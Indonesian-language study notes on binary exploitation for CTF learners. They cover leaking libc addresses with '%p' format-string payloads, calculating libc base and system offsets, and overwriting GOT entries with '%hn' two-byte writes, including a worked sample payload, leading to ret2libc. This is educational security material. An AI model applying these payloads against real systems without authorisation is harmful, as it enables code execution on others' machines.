# Binary Exploitation Notes

Kumpulan catatan singkat mengenai:

* Leak libc
* Format string
* GOT overwrite
* `%n` / `%hn`
* Identifikasi alamat memori
* Perhitungan offset libc

Ditulis dengan fokus agar mudah dipahami saat belajar maupun saat CTF.

---

# 1. Menentukan Libc yang Dipakai Binary

Gunakan:

```bash
ldd ./nama_binary
```

Cari file `libc.so.6` yang digunakan binary.

---

# 2. Mencari Offset Fungsi di Libc

Offset adalah jarak tetap sebuah fungsi dari base libc.

Gunakan:

```bash
readelf -s libc.so.6 | grep puts
```

atau:

```bash
nm -D libc.so.6 | grep puts
```

Contoh output:

```bash
0000000000067360 puts
```

Maka:

```bash
puts_offset = 0x67360
```

---

# 3. Leak Alamat Libc (Remote Exploit)

Jika tidak memiliki file libc server, lakukan leak alamat terlebih dahulu.

Contoh payload:

```bash
%p.%p.%p.%p.%p
```

Cari alamat yang terlihat seperti alamat libc:

## Pola Umum Alamat

### Stack

* `0xff...`
* `0xbfff...`
* `0x7ffffff...`

### Libc

* `0xf7...`
* `0xb7...`
* `0x7f...`

### Program / PIE / ELF

* `0x0804...`
* `0x55...`
* `0x56...`

### Integer / Data Kecil

Biasanya:

```bash
0x0
0x1
0x64
```

bukan pointer penting.

Validasi menggunakan:

```bash
vmmap
```

atau:

```bash
info proc mappings
```

---

# 4. Menebak Versi Libc

Jika mendapatkan leak seperti:

```bash
0xb7e52960
```

Gunakan:

* libc.rip
* libc-database

Masukkan:

* nama fungsi
* beberapa digit akhir leak

untuk menebak versi libc yang digunakan.

---

# 5. Mencari GOT Entry

Gunakan:

```bash
objdump -R ./nama_file
```

atau:

```bash
readelf -r ./nama_file
```

Digunakan untuk mencari target overwrite seperti:

* `printf@got`
* `puts@got`
* `exit@got`

---

# 6. Menghitung Libc Base

Jika ASLR aktif:

```text
libc_base = leak_address - function_offset
```

Contoh:

```bash
leak_puts  = 0xf7e12360
puts_offset = 0x67360

libc_base = leak_puts - puts_offset
```

Setelah mendapatkan base:

```bash
system = libc_base + system_offset
```

---

# 7. Mencari String "/bin/sh"

Dengan pwntools:

```python
next(libc.search(b"/bin/sh"))
```

Manual:

```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep "/bin/sh"
```

---

# 8. Cara Kerja `%n`

`%n` menulis jumlah karakter yang sudah tercetak.

Masalahnya:

```bash
0xdeadbeef = 3735928559
```

Nilai terlalu besar jika harus diprint langsung.

Karena itu digunakan `%hn` agar penulisan hanya 2 byte.

---

# 9. Teknik `%hn` (2-Byte Write)

Target:

```bash
0xdeadbeef
```

Pisahkan menjadi:

```bash
low  = 0xbeef = 48879
high = 0xdead = 57005
```

---

# 10. Kenapa Pakai `alamat + 2`

Contoh target:

```bash
0x0804a028
```

Maka:

```text
0x0804a028 -> low 2 byte
0x0804a02a -> high 2 byte
```

Karena `%hn` hanya menulis 2 byte.

Jadi alamat kedua digeser 2 byte.

---

# 11. Contoh Payload `%hn`

```bash
%48879c%10$hn%8126c%11$hn
```

## Penjelasan

### Write Pertama

```bash
%48879c%10$hn
```

Total karakter:

```bash
48879 -> 0xbeef
```

---

### Write Kedua

Target akhir:

```bash
57005 -> 0xdead
```

Karena sudah tercetak `48879`, maka:

```bash
57005 - 48879 = 8126
```

Payload:

```bash
%8126c%11$hn
```

Hasil:

```text
%10$hn -> menulis 0xbeef
%11$hn -> menulis 0xdead
```

---

# 12. Jika Nilai High Lebih Kecil dari Low

Gunakan integer wrap:

```bash
needed = (target2 + 0x10000) - target1
```

Karena `%hn` maksimum:

```bash
65535
```

Printf akan overflow lalu kembali ke angka kecil.

---

# 13. Menjalankan Exploit Remote

```bash
python3 exploit.py REMOTE
```

Biasanya:

```python
process() -> local
remote()  -> server
```

---

# Summary

## Leak & Libc

* Gunakan `ldd` untuk melihat libc
* Cari offset dengan `readelf` atau `nm`
* Leak alamat libc menggunakan `%p`
* Hitung `libc_base`
* Cari `system` dan `"/bin/sh"`

## Format String

* `%n` menulis jumlah karakter tercetak
* `%hn` digunakan untuk write 2 byte
* Pecah alamat menjadi low/high
* Gunakan `alamat + 2` untuk high part
* Gunakan integer wrap jika diperlukan

Teknik ini adalah dasar dari:

```text
Format String Leak
        ↓
Arbitrary Write
        ↓
GOT Overwrite
        ↓
ret2libc
```
